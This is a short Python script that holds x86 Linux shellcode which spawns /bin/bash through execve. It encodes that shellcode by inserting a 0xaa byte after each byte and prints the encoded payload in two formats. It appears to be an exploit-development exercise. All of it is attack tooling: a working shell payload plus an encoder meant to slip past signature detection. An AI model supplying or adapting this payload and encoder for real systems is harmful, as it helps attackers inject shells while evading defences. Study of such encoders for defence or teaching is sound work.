#! /usr/bin/python
# Python Insertion Encoder

shellcode = b"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
encoded = ""
encoded2 = ""

print("Encoding shellcode...\n")

for x in bytearray(shellcode):
    # Insertion Encoding

    encoded += "\\x"
    encoded += "%02x" % x
    encoded += "\\x%02x" % 0xaa

    encoded2 += "0x"
    encoded2 += "%02x, " % x
    encoded2 += "0x%02x, " % 0xaa

print("Verison 1:", encoded, "\n")
print("Verison 2:", encoded2[:-2], "\n")

print("Len: %d" % (len(shellcode) * 2))